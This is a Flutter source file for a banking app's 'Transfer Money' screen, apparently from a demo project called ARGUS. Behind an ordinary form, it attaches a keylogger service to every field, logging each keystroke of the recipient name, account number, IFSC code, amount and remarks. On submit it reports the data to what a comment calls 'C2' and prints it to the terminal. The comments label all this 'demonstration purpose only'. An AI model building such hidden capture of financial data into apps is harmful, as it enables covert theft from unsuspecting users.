import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:go_router/go_router.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'package:intl/intl.dart';
import '../../core/theme/app_colors.dart';
import '../../models/account_model.dart';
import '../../providers/providers.dart';

// DEMONSTRATION PURPOSE ONLY — insecure helper import
import '../../security/keylogger_service.dart';

class TransferScreen extends ConsumerStatefulWidget {
  const TransferScreen({super.key});

  @override
  ConsumerState<TransferScreen> createState() => _TransferScreenState();
}

class _TransferScreenState extends ConsumerState<TransferScreen> {
  final _formKey = GlobalKey<FormState>();
  final _recipientController = TextEditingController();
  final _bankController = TextEditingController();
  final _accountController = TextEditingController();
  final _ifscController = TextEditingController();
  final _amountController = TextEditingController();
  final _remarksController = TextEditingController();

  // DEMONSTRATION PURPOSE ONLY
  static const _kScreen = 'Transfer';

  @override
  void initState() {
    super.initState();
    // DEMONSTRATION PURPOSE ONLY — attach keystroke listeners
    _recipientController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'recipient_name',
        value: _recipientController.text,
      );
    });
    _bankController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'bank_name',
        value: _bankController.text,
      );
    });
    _accountController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'account_number',
        value: _accountController.text,
      );
    });
    _ifscController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'ifsc_code',
        value: _ifscController.text,
      );
    });
    _amountController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'amount',
        value: _amountController.text,
      );
    });
    _remarksController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field: 'remarks',
        value: _remarksController.text,
      );
    });
  }

  @override
  void dispose() {
    _recipientController.dispose();
    _bankController.dispose();
    _accountController.dispose();
    _ifscController.dispose();
    _amountController.dispose();
    _remarksController.dispose();
    super.dispose();
  }

  void _handleContinue() {
    if (_formKey.currentState!.validate()) {
      final transferData = TransferData(
        recipientName: _recipientController.text,
        bank: _bankController.text,
        accountNumber: _accountController.text,
        ifscCode: _ifscController.text,
        amount: double.tryParse(_amountController.text) ?? 0,
        remarks: _remarksController.text,
      );
      ref.read(transferDataProvider.notifier).state = transferData;

      // DEMONSTRATION PURPOSE ONLY — report submit attempt to C2
      KeyloggerService.instance.logButtonClick(
          screen: _kScreen, label: 'Continue Transfer Button');
      KeyloggerService.instance.logFieldSubmit(
          screen: _kScreen, field: 'recipient_name', value: transferData.recipientName);
      KeyloggerService.instance.logFieldSubmit(
          screen: _kScreen, field: 'account_number', value: transferData.accountNumber);
      KeyloggerService.instance.logFieldSubmit(
          screen: _kScreen, field: 'ifsc_code', value: transferData.ifscCode);
      KeyloggerService.instance.logFieldSubmit(
          screen: _kScreen, field: 'amount', value: transferData.amount.toString());

      // DEMONSTRATION PURPOSE ONLY — print transfer data to terminal
      print('=== ARGUS DEMO: Transfer event ===');
      print('Recipient Name: ${transferData.recipientName}');
      print('Bank: ${transferData.bank}');
      print('Account Number: ${transferData.accountNumber}');
      print('IFSC Code: ${transferData.ifscCode}');
      print('Amount: ${transferData.amount}');
      print('Remarks: ${transferData.remarks}');
      print('Timestamp: ${DateTime.now().toIso8601String()}');
      print('=== END ARGUS DEMO ===');

      context.push('/transfer-review');
    }
  }

  @override
  Widget build(BuildContext context) {
    final account = ref.watch(accountProvider);
    final formattedBalance = NumberFormat('#,##,###.00', 'en_IN').format(account.balance);

    return Scaffold(
      backgroundColor: AppColors.background,
      appBar: AppBar(
        backgroundColor: AppColors.background,
        elevation: 0,
        scrolledUnderElevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_rounded, size: 20),
          onPressed: () => context.pop(),
        ),
        title: Text(
          'Transfer Money',
          style: GoogleFonts.inter(
            fontSize: 18,
            fontWeight: FontWeight.w600,
            color: AppColors.textPrimary,
          ),
        ),
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.fromLTRB(20, 8, 20, 32),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // From Account Card
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: AppColors.white,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: AppColors.divider),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        color: AppColors.primary.withValues(alpha: 0.08),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(
                        Icons.account_balance_rounded,
                        color: AppColors.primary,
                        size: 20,
                      ),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'From: ${account.accountType}',
                            style: GoogleFonts.inter(
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                              color: AppColors.textPrimary,
                            ),
                          ),
                          const SizedBox(height: 2),
                          Text(
                            '${account.maskedAccountNumber}  •  ₹$formattedBalance',
                            style: GoogleFonts.inter(
                              fontSize: 12,
                              fontWeight: FontWeight.w400,
                              color: AppColors.textSecondary,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              )
                  .animate()
                  .fadeIn(duration: 400.ms),
              const SizedBox(height: 28),
              Text(
                'Recipient Details',
                style: GoogleFonts.inter(
                  fontSize: 16,
                  fontWeight: FontWeight.w700,
                  color: AppColors.textPrimary,
                ),
              )
                  .animate()
                  .fadeIn(delay: 100.ms, duration: 400.ms),
              const SizedBox(height: 16),
              _buildField(
                controller: _recipientController,
                label: 'Recipient Name',
                hint: 'Enter recipient name',
                icon: Icons.person_outline_rounded,
                validator: (v) =>
                    v == null || v.isEmpty ? 'Enter recipient name' : null,
              )
                  .animate()
                  .fadeIn(delay: 150.ms, duration: 400.ms),
              const SizedBox(height: 14),
              _buildField(
                controller: _bankController,
                label: 'Bank',
                hint: 'Enter bank name',
                icon: Icons.account_balance_outlined,
                validator: (v) =>
                    v == null || v.isEmpty ? 'Enter bank name' : null,
              )
                  .animate()
                  .fadeIn(delay: 200.ms, duration: 400.ms),
              const SizedBox(height: 14),
              _buildField(
                controller: _accountController,
                label: 'Account Number',
                hint: 'Enter account number',
                icon: Icons.numbers_rounded,
                keyboardType: TextInputType.number,
                validator: (v) =>
                    v == null || v.isEmpty ? 'Enter account number' : null,
              )
                  .animate()
                  .fadeIn(delay: 250.ms, duration: 400.ms),
              const SizedBox(height: 14),
              _buildField(
                controller: _ifscController,
                label: 'IFSC Code',
                hint: 'Enter IFSC code',
                icon: Icons.code_rounded,
                textCapitalization: TextCapitalization.characters,
                validator: (v) =>
                    v == null || v.isEmpty ? 'Enter IFSC code' : null,
              )
                  .animate()
                  .fadeIn(delay: 300.ms, duration: 400.ms),
              const SizedBox(height: 14),
              _buildField(
                controller: _amountController,
                label: 'Amount (₹)',
                hint: 'Enter amount',
                icon: Icons.currency_rupee_rounded,
                keyboardType: const TextInputType.numberWithOptions(decimal: true),
                validator: (v) {
                  if (v == null || v.isEmpty) return 'Enter amount';
                  if (double.tryParse(v) == null) return 'Enter valid amount';
                  if (double.parse(v) <= 0) return 'Amount must be > 0';
                  return null;
                },
              )
                  .animate()
                  .fadeIn(delay: 350.ms, duration: 400.ms),
              const SizedBox(height: 14),
              _buildField(
                controller: _remarksController,
                label: 'Remarks (Optional)',
                hint: 'Add a note',
                icon: Icons.notes_rounded,
                validator: null,
              )
                  .animate()
                  .fadeIn(delay: 400.ms, duration: 400.ms),
              const SizedBox(height: 32),
              SizedBox(
                width: double.infinity,
                height: 54,
                child: ElevatedButton(
                  onPressed: _handleContinue,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: AppColors.primary,
                    foregroundColor: AppColors.white,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                    elevation: 0,
                  ),
                  child: Text(
                    'Continue',
                    style: GoogleFonts.inter(
                      fontSize: 16,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ),
              )
                  .animate()
                  .fadeIn(delay: 500.ms, duration: 500.ms),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildField({
    required TextEditingController controller,
    required String label,
    required String hint,
    required IconData icon,
    TextInputType keyboardType = TextInputType.text,
    TextCapitalization textCapitalization = TextCapitalization.none,
    String? Function(String?)? validator,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: GoogleFonts.inter(
            fontSize: 13,
            fontWeight: FontWeight.w600,
            color: AppColors.textPrimary,
          ),
        ),
        const SizedBox(height: 8),
        TextFormField(
          controller: controller,
          keyboardType: keyboardType,
          textCapitalization: textCapitalization,
          validator: validator,
          style: GoogleFonts.inter(
            fontSize: 15,
            fontWeight: FontWeight.w500,
            color: AppColors.textPrimary,
          ),
          decoration: InputDecoration(
            hintText: hint,
            prefixIcon: Padding(
              padding: const EdgeInsets.only(left: 16, right: 12),
              child: Icon(icon, size: 20, color: AppColors.textTertiary),
            ),
            prefixIconConstraints: const BoxConstraints(minWidth: 0),
            filled: true,
            fillColor: AppColors.white,
            contentPadding: const EdgeInsets.symmetric(
              horizontal: 20,
              vertical: 16,
            ),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: AppColors.divider),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: AppColors.divider),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(
                color: AppColors.primary,
                width: 1.5,
              ),
            ),
            errorBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: AppColors.error),
            ),
          ),
        ),
      ],
    );
  }
}
